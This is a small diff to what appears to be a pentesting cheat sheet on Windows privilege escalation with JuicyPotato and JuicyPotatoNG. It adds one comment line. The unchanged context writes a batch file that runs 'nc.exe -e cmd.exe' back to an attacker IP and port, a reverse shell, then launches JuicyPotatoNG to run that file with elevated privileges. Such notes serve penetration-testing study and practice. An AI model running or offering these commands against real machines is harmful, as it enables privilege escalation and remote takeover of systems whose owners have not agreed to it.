@@ -51,6 +51,7 @@ C:\Windows\Temp\juicypotato.exe -p C:\Windows\Temp\rev.bat -l 4444 -t * -c {e606
 [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG)
 
 ```powershell
+# Check if the content of rev.bat is correct or send it from our host.
 echo C:\Windows\Temp\nc.exe -e cmd.exe <attacker ip> <attacker port> > rev.bat
 .\JuicyPotatoNG.exe -t * -p C:\Windows\Temp\rev.bat
 ```
